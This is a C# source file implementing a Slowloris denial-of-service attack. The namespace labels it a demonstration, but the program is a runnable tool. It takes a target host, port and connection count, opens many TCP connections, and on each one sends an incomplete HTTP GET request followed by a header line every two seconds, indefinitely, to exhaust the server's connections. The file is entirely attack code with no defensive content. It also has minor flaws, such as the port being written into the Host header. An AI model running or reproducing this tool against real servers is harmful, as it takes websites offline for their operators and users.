using System;
using System.Net;
using System.Net.Sockets;
using System.Threading.Tasks;
using McMaster.Extensions.CommandLineUtils;

namespace DoSMethodsDemonstration
{
    [HelpOption]
    public class SlowLoris6
    {
        /*[Option(Description = "The host to attack.")]
        public string Host { get; }

        [Option(Description = "The host's port to attack.")]
        public int Port { get; }

        [Option(Description = "Number of connections to the host.")]
        public int Connections { get; }

        public static void Main(string[] args)
            => CommandLineApplication.Execute<SlowLoris6>(args);*/

        public static void Main(string[] args)
        {
            OnExecute(args[0], Convert.ToInt32(args[1]), Convert.ToInt32(args[2]));
        }

        public static void OnExecute(string Host, int Port, int Connections)
        {

            //Console.WriteLine($"[Info] Attacking {Host}:{Port}");
            Console.WriteLine($"[Info] Attacking " + Host +":" + Port);

            //string requestHeader = $"GET / HTTP/1.1\r\nHost: {Host}\r\n";
            string requestHeader = $"GET / HTTP/1.1\r\nHost: " + Port + "\r\n";

            Console.WriteLine($"[info] GET request will be :\n======\n{requestHeader}======");


            for (var i = 0; i < Connections; i++)
            {
                var slowloris = new Slowloris();
                slowloris.Attack(IPAddress.Parse(Host), Port, requestHeader);
            }

            while (true) { };
        }
    }

    class Slowloris
    {
        private static int SLOWLORIS_ATTACKS_COUNT = 0;

        private TcpClient client;

        public void Attack(IPAddress ip, int port, string requestHeader)
        {

            //init tcp client
            client = new TcpClient();
            client.Client.Connect(ip, port);

            while (true)
            {
                if (client.Connected) break;
            }

            Console.WriteLine("[Info]: Slowloris " + ++SLOWLORIS_ATTACKS_COUNT + " attack launched...");

            //send incomplete GET request
            client.Client.Send(getBytes(requestHeader));

            StartSendingHeaderChunks();
        }

        private Byte[] getBytes(string message)
            => System.Text.Encoding.ASCII.GetBytes(message);

        private async Task StartSendingHeaderChunks()
        {

            //send chunk headers... forever...
            while (true)
            {
                client.Client.Send(getBytes("dotloris: dotloris\r\n"));

                await Task.Delay(2000);
            }
        }
    }
}